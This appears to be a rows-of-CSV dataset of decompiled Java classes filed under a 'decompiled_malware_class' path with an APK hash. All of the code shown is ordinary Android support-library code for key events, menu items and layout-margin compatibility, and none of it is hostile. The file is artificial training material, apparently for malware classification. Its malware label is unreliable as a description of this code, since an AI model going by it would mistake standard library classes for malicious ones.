"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\HoneycombKeyEventVersionImpl.code","static class HoneycombKeyEventVersionImpl extends EclairKeyEventVersionImpl {   HoneycombKeyEventVersionImpl(){   }   @Override public int normalizeMetaState(  int metaState){     return KeyEventCompatHoneycomb.normalizeMetaState(metaState);   }   @Override public boolean metaStateHasModifiers(  int metaState,  int modifiers){     return KeyEventCompatHoneycomb.metaStateHasModifiers(metaState,modifiers);   }   @Override public boolean metaStateHasNoModifiers(  int metaState){     return KeyEventCompatHoneycomb.metaStateHasNoModifiers(metaState);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\HoneycombMenuVersionImpl.code","static class HoneycombMenuVersionImpl implements MenuVersionImpl {   HoneycombMenuVersionImpl(){   }   @Override public void setShowAsAction(  MenuItem item,  int actionEnum){     MenuItemCompatHoneycomb.setShowAsAction(item,actionEnum);   }   @Override public MenuItem setActionView(  MenuItem item,  View view){     return MenuItemCompatHoneycomb.setActionView(item,view);   }   @Override public MenuItem setActionView(  MenuItem item,  int resId){     return MenuItemCompatHoneycomb.setActionView(item,resId);   }   @Override public View getActionView(  MenuItem item){     return MenuItemCompatHoneycomb.getActionView(item);   }   @Override public boolean expandActionView(  MenuItem item){     return false;   }   @Override public boolean collapseActionView(  MenuItem item){     return false;   }   @Override public boolean isActionViewExpanded(  MenuItem item){     return false;   }   @Override public MenuItem setOnActionExpandListener(  MenuItem item,  OnActionExpandListener listener){     return item;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\HoneycombVelocityTrackerVersionImpl.code","static class HoneycombVelocityTrackerVersionImpl implements VelocityTrackerVersionImpl {   HoneycombVelocityTrackerVersionImpl(){   }   @Override public float getXVelocity(  VelocityTracker tracker,  int pointerId){     return VelocityTrackerCompatHoneycomb.getXVelocity(tracker,pointerId);   }   @Override public float getYVelocity(  VelocityTracker tracker,  int pointerId){     return VelocityTrackerCompatHoneycomb.getYVelocity(tracker,pointerId);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\IcsMenuVersionImpl.code","static class IcsMenuVersionImpl extends HoneycombMenuVersionImpl {   IcsMenuVersionImpl(){   }   @Override public boolean expandActionView(  MenuItem item){     return MenuItemCompatIcs.expandActionView(item);   }   @Override public boolean collapseActionView(  MenuItem item){     return MenuItemCompatIcs.collapseActionView(item);   }   @Override public boolean isActionViewExpanded(  MenuItem item){     return MenuItemCompatIcs.isActionViewExpanded(item);   }   @Override public MenuItem setOnActionExpandListener(  MenuItem item,  final OnActionExpandListener listener){     return listener == null ? MenuItemCompatIcs.setOnActionExpandListener(item,null) : MenuItemCompatIcs.setOnActionExpandListener(item,new MenuItemCompatIcs.SupportActionExpandProxy(){       @Override public boolean onMenuItemActionExpand(      MenuItem item2){         return listener.onMenuItemActionExpand(item2);       }       @Override public boolean onMenuItemActionCollapse(      MenuItem item2){         return listener.onMenuItemActionCollapse(item2);       }     } );   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\ICSViewCompatImpl.code","static class ICSViewCompatImpl extends HCViewCompatImpl {   ICSViewCompatImpl(){   }   @Override public boolean canScrollHorizontally(  View v,  int direction){     return ViewCompatICS.canScrollHorizontally(v,direction);   }   @Override public boolean canScrollVertically(  View v,  int direction){     return ViewCompatICS.canScrollVertically(v,direction);   }   @Override public void onPopulateAccessibilityEvent(  View v,  AccessibilityEvent event){     ViewCompatICS.onPopulateAccessibilityEvent(v,event);   }   @Override public void onInitializeAccessibilityEvent(  View v,  AccessibilityEvent event){     ViewCompatICS.onInitializeAccessibilityEvent(v,event);   }   @Override public void onInitializeAccessibilityNodeInfo(  View v,  AccessibilityNodeInfoCompat info){     ViewCompatICS.onInitializeAccessibilityNodeInfo(v,info.getInfo());   }   @Override public void setAccessibilityDelegate(  View v,  AccessibilityDelegateCompat delegate){     ViewCompatICS.setAccessibilityDelegate(v,delegate.getBridge());   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\ItemInfo.code","public static class ItemInfo {   Object object;   float offset;   int position;   boolean scrolling;   float widthFactor;   ItemInfo(){   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\JbMr1ViewCompatImpl.code","static class JbMr1ViewCompatImpl extends JBViewCompatImpl {   JbMr1ViewCompatImpl(){   }   @Override public int getLabelFor(  View view){     return ViewCompatJellybeanMr1.getLabelFor(view);   }   @Override public void setLabelFor(  View view,  int id){     ViewCompatJellybeanMr1.setLabelFor(view,id);   }   @Override public void setLayerPaint(  View view,  Paint paint){     ViewCompatJellybeanMr1.setLayerPaint(view,paint);   }   @Override public int getLayoutDirection(  View view){     return ViewCompatJellybeanMr1.getLayoutDirection(view);   }   @Override public void setLayoutDirection(  View view,  int layoutDirection){     ViewCompatJellybeanMr1.setLayoutDirection(view,layoutDirection);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\JBViewCompatImpl.code","static class JBViewCompatImpl extends ICSViewCompatImpl {   JBViewCompatImpl(){   }   @Override public boolean hasTransientState(  View view){     return ViewCompatJB.hasTransientState(view);   }   @Override public void setHasTransientState(  View view,  boolean hasTransientState){     ViewCompatJB.setHasTransientState(view,hasTransientState);   }   @Override public void postInvalidateOnAnimation(  View view){     ViewCompatJB.postInvalidateOnAnimation(view);   }   @Override public void postInvalidateOnAnimation(  View view,  int left,  int top,  int right,  int bottom){     ViewCompatJB.postInvalidateOnAnimation(view,left,top,right,bottom);   }   @Override public void postOnAnimation(  View view,  Runnable action){     ViewCompatJB.postOnAnimation(view,action);   }   @Override public void postOnAnimationDelayed(  View view,  Runnable action,  long delayMillis){     ViewCompatJB.postOnAnimationDelayed(view,action,delayMillis);   }   @Override public int getImportantForAccessibility(  View view){     return ViewCompatJB.getImportantForAccessibility(view);   }   @Override public void setImportantForAccessibility(  View view,  int mode){     ViewCompatJB.setImportantForAccessibility(view,mode);   }   @Override public boolean performAccessibilityAction(  View view,  int action,  Bundle arguments){     return ViewCompatJB.performAccessibilityAction(view,action,arguments);   }   @Override public AccessibilityNodeProviderCompat getAccessibilityNodeProvider(  View view){     Object compat=ViewCompatJB.getAccessibilityNodeProvider(view);     if (compat != null) {       return new AccessibilityNodeProviderCompat(compat);     }     return null;   }   @Override public ViewParent getParentForAccessibility(  View view){     return ViewCompatJB.getParentForAccessibility(view);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\KeyEventCompat.code","public class KeyEventCompat {   static final KeyEventVersionImpl IMPL; interface KeyEventVersionImpl {     boolean dispatch(    KeyEvent keyEvent,    KeyEvent.Callback callback,    Object obj,    Object obj2);     Object getKeyDispatcherState(    View view);     boolean isTracking(    KeyEvent keyEvent);     boolean metaStateHasModifiers(    int i,    int i2);     boolean metaStateHasNoModifiers(    int i);     int normalizeMetaState(    int i);     void startTracking(    KeyEvent keyEvent);   } static class BaseKeyEventVersionImpl implements KeyEventVersionImpl {     private static final int META_ALL_MASK=247;     private static final int META_MODIFIER_MASK=247;     BaseKeyEventVersionImpl(){     }     private static int metaStateFilterDirectionalModifiers(    int metaState,    int modifiers,    int basic,    int left,    int right){       boolean wantBasic=(modifiers & basic) != 0;       int directional=left | right;       boolean wantLeftOrRight=(modifiers & directional) != 0;       if (wantBasic) {         if (wantLeftOrRight) {           throw new IllegalArgumentException(""bad arguments"");         }         return metaState & (directional ^ (-1));       }       if (wantLeftOrRight) {         return metaState & (basic ^ (-1));       }       return metaState;     }     @Override public int normalizeMetaState(    int metaState){       if ((metaState & 192) != 0) {         metaState|=1;       }       if ((metaState & 48) != 0) {         metaState|=2;       }       return metaState & 247;     }     @Override public boolean metaStateHasModifiers(    int metaState,    int modifiers){       return metaStateFilterDirectionalModifiers(metaStateFilterDirectionalModifiers(normalizeMetaState(metaState) & 247,modifiers,1,64,128),modifiers,2,16,32) == modifiers;     }     @Override public boolean metaStateHasNoModifiers(    int metaState){       return (normalizeMetaState(metaState) & 247) == 0;     }     @Override public void startTracking(    KeyEvent event){     }     @Override public boolean isTracking(    KeyEvent event){       return false;     }     @Override public Object getKeyDispatcherState(    View view){       return null;     }     @Override public boolean dispatch(    KeyEvent event,    KeyEvent.Callback receiver,    Object state,    Object target){       return event.dispatch(receiver);     }   } static class EclairKeyEventVersionImpl extends BaseKeyEventVersionImpl {     EclairKeyEventVersionImpl(){     }     @Override public void startTracking(    KeyEvent event){       KeyEventCompatEclair.startTracking(event);     }     @Override public boolean isTracking(    KeyEvent event){       return KeyEventCompatEclair.isTracking(event);     }     @Override public Object getKeyDispatcherState(    View view){       return KeyEventCompatEclair.getKeyDispatcherState(view);     }     @Override public boolean dispatch(    KeyEvent event,    KeyEvent.Callback receiver,    Object state,    Object target){       return KeyEventCompatEclair.dispatch(event,receiver,state,target);     }   } static class HoneycombKeyEventVersionImpl extends EclairKeyEventVersionImpl {     HoneycombKeyEventVersionImpl(){     }     @Override public int normalizeMetaState(    int metaState){       return KeyEventCompatHoneycomb.normalizeMetaState(metaState);     }     @Override public boolean metaStateHasModifiers(    int metaState,    int modifiers){       return KeyEventCompatHoneycomb.metaStateHasModifiers(metaState,modifiers);     }     @Override public boolean metaStateHasNoModifiers(    int metaState){       return KeyEventCompatHoneycomb.metaStateHasNoModifiers(metaState);     }   } static {     if (Build.VERSION.SDK_INT >= 11) {       IMPL=new HoneycombKeyEventVersionImpl();     }  else {       IMPL=new BaseKeyEventVersionImpl();     }   }   public static int normalizeMetaState(  int metaState){     return IMPL.normalizeMetaState(metaState);   }   public static boolean metaStateHasModifiers(  int metaState,  int modifiers){     return IMPL.metaStateHasModifiers(metaState,modifiers);   }   public static boolean metaStateHasNoModifiers(  int metaState){     return IMPL.metaStateHasNoModifiers(metaState);   }   public static boolean hasModifiers(  KeyEvent event,  int modifiers){     return IMPL.metaStateHasModifiers(event.getMetaState(),modifiers);   }   public static boolean hasNoModifiers(  KeyEvent event){     return IMPL.metaStateHasNoModifiers(event.getMetaState());   }   public static void startTracking(  KeyEvent event){     IMPL.startTracking(event);   }   public static boolean isTracking(  KeyEvent event){     return IMPL.isTracking(event);   }   public static Object getKeyDispatcherState(  View view){     return IMPL.getKeyDispatcherState(view);   }   public static boolean dispatch(  KeyEvent event,  KeyEvent.Callback receiver,  Object state,  Object target){     return IMPL.dispatch(event,receiver,state,target);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\KeyEventCompatEclair.code","class KeyEventCompatEclair {   KeyEventCompatEclair(){   }   public static Object getKeyDispatcherState(  View view){     return view.getKeyDispatcherState();   }   public static boolean dispatch(  KeyEvent event,  KeyEvent.Callback receiver,  Object state,  Object target){     return event.dispatch(receiver,(KeyEvent.DispatcherState)state,target);   }   public static void startTracking(  KeyEvent event){     event.startTracking();   }   public static boolean isTracking(  KeyEvent event){     return event.isTracking();   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\KeyEventCompatHoneycomb.code","class KeyEventCompatHoneycomb {   KeyEventCompatHoneycomb(){   }   public static int normalizeMetaState(  int metaState){     return KeyEvent.normalizeMetaState(metaState);   }   public static boolean metaStateHasModifiers(  int metaState,  int modifiers){     return KeyEvent.metaStateHasModifiers(metaState,modifiers);   }   public static boolean metaStateHasNoModifiers(  int metaState){     return KeyEvent.metaStateHasNoModifiers(metaState);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\KeyEventVersionImpl.code","interface KeyEventVersionImpl {   boolean dispatch(  KeyEvent keyEvent,  KeyEvent.Callback callback,  Object obj,  Object obj2);   Object getKeyDispatcherState(  View view);   boolean isTracking(  KeyEvent keyEvent);   boolean metaStateHasModifiers(  int i,  int i2);   boolean metaStateHasNoModifiers(  int i);   int normalizeMetaState(  int i);   void startTracking(  KeyEvent keyEvent); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\KitKatViewCompatImpl.code","static class KitKatViewCompatImpl extends JbMr1ViewCompatImpl {   KitKatViewCompatImpl(){   }   @Override public int getAccessibilityLiveRegion(  View view){     return ViewCompatKitKat.getAccessibilityLiveRegion(view);   }   @Override public void setAccessibilityLiveRegion(  View view,  int mode){     ViewCompatKitKat.setAccessibilityLiveRegion(view,mode);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\LayoutParams.code","public static class LayoutParams extends ViewGroup.LayoutParams {   int childIndex;   public int gravity;   public boolean isDecor;   boolean needsMeasure;   int position;   float widthFactor;   public LayoutParams(){     super(-1,-1);     this.widthFactor=0.0f;   }   public LayoutParams(  Context context,  AttributeSet attrs){     super(context,attrs);     this.widthFactor=0.0f;     TypedArray a=context.obtainStyledAttributes(attrs,ViewPager.LAYOUT_ATTRS);     this.gravity=a.getInteger(0,48);     a.recycle();   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\MarginLayoutParamsCompat.code","public class MarginLayoutParamsCompat {   static final MarginLayoutParamsCompatImpl IMPL; interface MarginLayoutParamsCompatImpl {     int getLayoutDirection(    ViewGroup.MarginLayoutParams marginLayoutParams);     int getMarginEnd(    ViewGroup.MarginLayoutParams marginLayoutParams);     int getMarginStart(    ViewGroup.MarginLayoutParams marginLayoutParams);     boolean isMarginRelative(    ViewGroup.MarginLayoutParams marginLayoutParams);     void resolveLayoutDirection(    ViewGroup.MarginLayoutParams marginLayoutParams,    int i);     void setLayoutDirection(    ViewGroup.MarginLayoutParams marginLayoutParams,    int i);     void setMarginEnd(    ViewGroup.MarginLayoutParams marginLayoutParams,    int i);     void setMarginStart(    ViewGroup.MarginLayoutParams marginLayoutParams,    int i);   } static class MarginLayoutParamsCompatImplBase implements MarginLayoutParamsCompatImpl {     MarginLayoutParamsCompatImplBase(){     }     @Override public int getMarginStart(    ViewGroup.MarginLayoutParams lp){       return lp.leftMargin;     }     @Override public int getMarginEnd(    ViewGroup.MarginLayoutParams lp){       return lp.rightMargin;     }     @Override public void setMarginStart(    ViewGroup.MarginLayoutParams lp,    int marginStart){       lp.leftMargin=marginStart;     }     @Override public void setMarginEnd(    ViewGroup.MarginLayoutParams lp,    int marginEnd){       lp.rightMargin=marginEnd;     }     @Override public boolean isMarginRelative(    ViewGroup.MarginLayoutParams lp){       return false;     }     @Override public int getLayoutDirection(    ViewGroup.MarginLayoutParams lp){       return 0;     }     @Override public void setLayoutDirection(    ViewGroup.MarginLayoutParams lp,    int layoutDirection){     }     @Override public void resolveLayoutDirection(    ViewGroup.MarginLayoutParams lp,    int layoutDirection){     }   } static class MarginLayoutParamsCompatImplJbMr1 implements MarginLayoutParamsCompatImpl {     MarginLayoutParamsCompatImplJbMr1(){     }     @Override public int getMarginStart(    ViewGroup.MarginLayoutParams lp){       return MarginLayoutParamsCompatJellybeanMr1.getMarginStart(lp);     }     @Override public int getMarginEnd(    ViewGroup.MarginLayoutParams lp){       return MarginLayoutParamsCompatJellybeanMr1.getMarginEnd(lp);     }     @Override public void setMarginStart(    ViewGroup.MarginLayoutParams lp,    int marginStart){       MarginLayoutParamsCompatJellybeanMr1.setMarginStart(lp,marginStart);     }     @Override public void setMarginEnd(    ViewGroup.MarginLayoutParams lp,    int marginEnd){       MarginLayoutParamsCompatJellybeanMr1.setMarginEnd(lp,marginEnd);     }     @Override public boolean isMarginRelative(    ViewGroup.MarginLayoutParams lp){       return MarginLayoutParamsCompatJellybeanMr1.isMarginRelative(lp);     }     @Override public int getLayoutDirection(    ViewGroup.MarginLayoutParams lp){       return MarginLayoutParamsCompatJellybeanMr1.getLayoutDirection(lp);     }     @Override public void setLayoutDirection(    ViewGroup.MarginLayoutParams lp,    int layoutDirection){       MarginLayoutParamsCompatJellybeanMr1.setLayoutDirection(lp,layoutDirection);     }     @Override public void resolveLayoutDirection(    ViewGroup.MarginLayoutParams lp,    int layoutDirection){       MarginLayoutParamsCompatJellybeanMr1.resolveLayoutDirection(lp,layoutDirection);     }   } static {     int version=Build.VERSION.SDK_INT;     if (version >= 17) {       IMPL=new MarginLayoutParamsCompatImplJbMr1();     }  else {       IMPL=new MarginLayoutParamsCompatImplBase();     }   }   public static int getMarginStart(  ViewGroup.MarginLayoutParams lp){     return IMPL.getMarginStart(lp);   }   public static int getMarginEnd(  ViewGroup.MarginLayoutParams lp){     return IMPL.getMarginEnd(lp);   }   public static void setMarginStart(  ViewGroup.MarginLayoutParams lp,  int marginStart){     IMPL.setMarginStart(lp,marginStart);   }   public static void setMarginEnd(  ViewGroup.MarginLayoutParams lp,  int marginEnd){     IMPL.setMarginEnd(lp,marginEnd);   }   public static boolean isMarginRelative(  ViewGroup.MarginLayoutParams lp){     return IMPL.isMarginRelative(lp);   }   public static int getLayoutDirection(  ViewGroup.MarginLayoutParams lp){     return IMPL.getLayoutDirection(lp);   }   public static void setLayoutDirection(  ViewGroup.MarginLayoutParams lp,  int layoutDirection){     IMPL.setLayoutDirection(lp,layoutDirection);   }   public static void resolveLayoutDirection(  ViewGroup.MarginLayoutParams lp,  int layoutDirection){     IMPL.resolveLayoutDirection(lp,layoutDirection);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\MarginLayoutParamsCompatImpl.code","interface MarginLayoutParamsCompatImpl {   int getLayoutDirection(  ViewGroup.MarginLayoutParams marginLayoutParams);   int getMarginEnd(  ViewGroup.MarginLayoutParams marginLayoutParams);   int getMarginStart(  ViewGroup.MarginLayoutParams marginLayoutParams);   boolean isMarginRelative(  ViewGroup.MarginLayoutParams marginLayoutParams);   void resolveLayoutDirection(  ViewGroup.MarginLayoutParams marginLayoutParams,  int i);   void setLayoutDirection(  ViewGroup.MarginLayoutParams marginLayoutParams,  int i);   void setMarginEnd(  ViewGroup.MarginLayoutParams marginLayoutParams,  int i);   void setMarginStart(  ViewGroup.MarginLayoutParams marginLayoutParams,  int i); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\MarginLayoutParamsCompatImplBase.code","static class MarginLayoutParamsCompatImplBase implements MarginLayoutParamsCompatImpl {   MarginLayoutParamsCompatImplBase(){   }   @Override public int getMarginStart(  ViewGroup.MarginLayoutParams lp){     return lp.leftMargin;   }   @Override public int getMarginEnd(  ViewGroup.MarginLayoutParams lp){     return lp.rightMargin;   }   @Override public void setMarginStart(  ViewGroup.MarginLayoutParams lp,  int marginStart){     lp.leftMargin=marginStart;   }   @Override public void setMarginEnd(  ViewGroup.MarginLayoutParams lp,  int marginEnd){     lp.rightMargin=marginEnd;   }   @Override public boolean isMarginRelative(  ViewGroup.MarginLayoutParams lp){     return false;   }   @Override public int getLayoutDirection(  ViewGroup.MarginLayoutParams lp){     return 0;   }   @Override public void setLayoutDirection(  ViewGroup.MarginLayoutParams lp,  int layoutDirection){   }   @Override public void resolveLayoutDirection(  ViewGroup.MarginLayoutParams lp,  int layoutDirection){   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\MarginLayoutParamsCompatImplJbMr1.code","static class MarginLayoutParamsCompatImplJbMr1 implements MarginLayoutParamsCompatImpl {   MarginLayoutParamsCompatImplJbMr1(){   }   @Override public int getMarginStart(  ViewGroup.MarginLayoutParams lp){     return MarginLayoutParamsCompatJellybeanMr1.getMarginStart(lp);   }   @Override public int getMarginEnd(  ViewGroup.MarginLayoutParams lp){     return MarginLayoutParamsCompatJellybeanMr1.getMarginEnd(lp);   }   @Override public void setMarginStart(  ViewGroup.MarginLayoutParams lp,  int marginStart){     MarginLayoutParamsCompatJellybeanMr1.setMarginStart(lp,marginStart);   }   @Override public void setMarginEnd(  ViewGroup.MarginLayoutParams lp,  int marginEnd){     MarginLayoutParamsCompatJellybeanMr1.setMarginEnd(lp,marginEnd);   }   @Override public boolean isMarginRelative(  ViewGroup.MarginLayoutParams lp){     return MarginLayoutParamsCompatJellybeanMr1.isMarginRelative(lp);   }   @Override public int getLayoutDirection(  ViewGroup.MarginLayoutParams lp){     return MarginLayoutParamsCompatJellybeanMr1.getLayoutDirection(lp);   }   @Override public void setLayoutDirection(  ViewGroup.MarginLayoutParams lp,  int layoutDirection){     MarginLayoutParamsCompatJellybeanMr1.setLayoutDirection(lp,layoutDirection);   }   @Override public void resolveLayoutDirection(  ViewGroup.MarginLayoutParams lp,  int layoutDirection){     MarginLayoutParamsCompatJellybeanMr1.resolveLayoutDirection(lp,layoutDirection);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\MarginLayoutParamsCompatJellybeanMr1.code","class MarginLayoutParamsCompatJellybeanMr1 {   MarginLayoutParamsCompatJellybeanMr1(){   }   public static int getMarginStart(  ViewGroup.MarginLayoutParams lp){     return lp.getMarginStart();   }   public static int getMarginEnd(  ViewGroup.MarginLayoutParams lp){     return lp.getMarginEnd();   }   public static void setMarginStart(  ViewGroup.MarginLayoutParams lp,  int marginStart){     lp.setMarginStart(marginStart);   }   public static void setMarginEnd(  ViewGroup.MarginLayoutParams lp,  int marginEnd){     lp.setMarginEnd(marginEnd);   }   public static boolean isMarginRelative(  ViewGroup.MarginLayoutParams lp){     return lp.isMarginRelative();   }   public static int getLayoutDirection(  ViewGroup.MarginLayoutParams lp){     return lp.getLayoutDirection();   }   public static void setLayoutDirection(  ViewGroup.MarginLayoutParams lp,  int layoutDirection){     lp.setLayoutDirection(layoutDirection);   }   public static void resolveLayoutDirection(  ViewGroup.MarginLayoutParams lp,  int layoutDirection){     lp.resolveLayoutDirection(layoutDirection);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\MenuCompat.code","public class MenuCompat {   @Deprecated public static void setShowAsAction(  MenuItem item,  int actionEnum){     MenuItemCompat.setShowAsAction(item,actionEnum);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\MenuItemCompat.code","public class MenuItemCompat {   static final MenuVersionImpl IMPL;   public static final int SHOW_AS_ACTION_ALWAYS=2;   public static final int SHOW_AS_ACTION_COLLAPSE_ACTION_VIEW=8;   public static final int SHOW_AS_ACTION_IF_ROOM=1;   public static final int SHOW_AS_ACTION_NEVER=0;   public static final int SHOW_AS_ACTION_WITH_TEXT=4;   private static final String TAG=""MenuItemCompat""; interface MenuVersionImpl {     boolean collapseActionView(    MenuItem menuItem);     boolean expandActionView(    MenuItem menuItem);     View getActionView(    MenuItem menuItem);     boolean isActionViewExpanded(    MenuItem menuItem);     MenuItem setActionView(    MenuItem menuItem,    int i);     MenuItem setActionView(    MenuItem menuItem,    View view);     MenuItem setOnActionExpandListener(    MenuItem menuItem,    OnActionExpandListener onActionExpandListener);     void setShowAsAction(    MenuItem menuItem,    int i);   } public interface OnActionExpandListener {     boolean onMenuItemActionCollapse(    MenuItem menuItem);     boolean onMenuItemActionExpand(    MenuItem menuItem);   } static class BaseMenuVersionImpl implements MenuVersionImpl {     BaseMenuVersionImpl(){     }     @Override public void setShowAsAction(    MenuItem item,    int actionEnum){     }     @Override public MenuItem setActionView(    MenuItem item,    View view){       return item;     }     @Override public MenuItem setActionView(    MenuItem item,    int resId){       return item;     }     @Override public View getActionView(    MenuItem item){       return null;     }     @Override public boolean expandActionView(    MenuItem item){       return false;     }     @Override public boolean collapseActionView(    MenuItem item){       return false;     }     @Override public boolean isActionViewExpanded(    MenuItem item){       return false;     }     @Override public MenuItem setOnActionExpandListener(    MenuItem item,    OnActionExpandListener listener){       return item;     }   } static class HoneycombMenuVersionImpl implements MenuVersionImpl {     HoneycombMenuVersionImpl(){     }     @Override public void setShowAsAction(    MenuItem item,    int actionEnum){       MenuItemCompatHoneycomb.setShowAsAction(item,actionEnum);     }     @Override public MenuItem setActionView(    MenuItem item,    View view){       return MenuItemCompatHoneycomb.setActionView(item,view);     }     @Override public MenuItem setActionView(    MenuItem item,    int resId){       return MenuItemCompatHoneycomb.setActionView(item,resId);     }     @Override public View getActionView(    MenuItem item){       return MenuItemCompatHoneycomb.getActionView(item);     }     @Override public boolean expandActionView(    MenuItem item){       return false;     }     @Override public boolean collapseActionView(    MenuItem item){       return false;     }     @Override public boolean isActionViewExpanded(    MenuItem item){       return false;     }     @Override public MenuItem setOnActionExpandListener(    MenuItem item,    OnActionExpandListener listener){       return item;     }   } static class IcsMenuVersionImpl extends HoneycombMenuVersionImpl {     IcsMenuVersionImpl(){     }     @Override public boolean expandActionView(    MenuItem item){       return MenuItemCompatIcs.expandActionView(item);     }     @Override public boolean collapseActionView(    MenuItem item){       return MenuItemCompatIcs.collapseActionView(item);     }     @Override public boolean isActionViewExpanded(    MenuItem item){       return MenuItemCompatIcs.isActionViewExpanded(item);     }     @Override public MenuItem setOnActionExpandListener(    MenuItem item,    final OnActionExpandListener listener){       return listener == null ? MenuItemCompatIcs.setOnActionExpandListener(item,null) : MenuItemCompatIcs.setOnActionExpandListener(item,new MenuItemCompatIcs.SupportActionExpandProxy(){         @Override public boolean onMenuItemActionExpand(        MenuItem item2){           return listener.onMenuItemActionExpand(item2);         }         @Override public boolean onMenuItemActionCollapse(        MenuItem item2){           return listener.onMenuItemActionCollapse(item2);         }       } );     }   } static {     int version=Build.VERSION.SDK_INT;     if (version >= 14) {       IMPL=new IcsMenuVersionImpl();     }  else     if (version >= 11) {       IMPL=new HoneycombMenuVersionImpl();     }  else {       IMPL=new BaseMenuVersionImpl();     }   }   public static void setShowAsAction(  MenuItem item,  int actionEnum){     if (item instanceof SupportMenuItem) {       ((SupportMenuItem)item).setShowAsAction(actionEnum);     }  else {       IMPL.setShowAsAction(item,actionEnum);     }   }   public static MenuItem setActionView(  MenuItem item,  View view){     return item instanceof SupportMenuItem ? ((SupportMenuItem)item).setActionView(view) : IMPL.setActionView(item,view);   }   public static MenuItem setActionView(  MenuItem item,  int resId){     return item instanceof SupportMenuItem ? ((SupportMenuItem)item).setActionView(resId) : IMPL.setActionView(item,resId);   }   public static View getActionView(  MenuItem item){     return item instanceof SupportMenuItem ? ((SupportMenuItem)item).getActionView() : IMPL.getActionView(item);   }   public static MenuItem setActionProvider(  MenuItem item,  ActionProvider provider){     if (item instanceof SupportMenuItem) {       return ((SupportMenuItem)item).setSupportActionProvider(provider);     }     Log.w(TAG,""setActionProvider: item does not implement SupportMenuItem; ignoring"");     return item;   }   public static ActionProvider getActionProvider(  MenuItem item){     if (item instanceof SupportMenuItem) {       return ((SupportMenuItem)item).getSupportActionProvider();     }     Log.w(TAG,""getActionProvider: item does not implement SupportMenuItem; returning null"");     return null;   }   public static boolean expandActionView(  MenuItem item){     return item instanceof SupportMenuItem ? ((SupportMenuItem)item).expandActionView() : IMPL.expandActionView(item);   }   public static boolean collapseActionView(  MenuItem item){     return item instanceof SupportMenuItem ? ((SupportMenuItem)item).collapseActionView() : IMPL.collapseActionView(item);   }   public static boolean isActionViewExpanded(  MenuItem item){     return item instanceof SupportMenuItem ? ((SupportMenuItem)item).isActionViewExpanded() : IMPL.isActionViewExpanded(item);   }   public static MenuItem setOnActionExpandListener(  MenuItem item,  OnActionExpandListener listener){     return item instanceof SupportMenuItem ? ((SupportMenuItem)item).setSupportOnActionExpandListener(listener) : IMPL.setOnActionExpandListener(item,listener);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\MenuItemCompatHoneycomb.code","class MenuItemCompatHoneycomb {   MenuItemCompatHoneycomb(){   }   public static void setShowAsAction(  MenuItem item,  int actionEnum){     item.setShowAsAction(actionEnum);   }   public static MenuItem setActionView(  MenuItem item,  View view){     return item.setActionView(view);   }   public static MenuItem setActionView(  MenuItem item,  int resId){     return item.setActionView(resId);   }   public static View getActionView(  MenuItem item){     return item.getActionView();   } } "
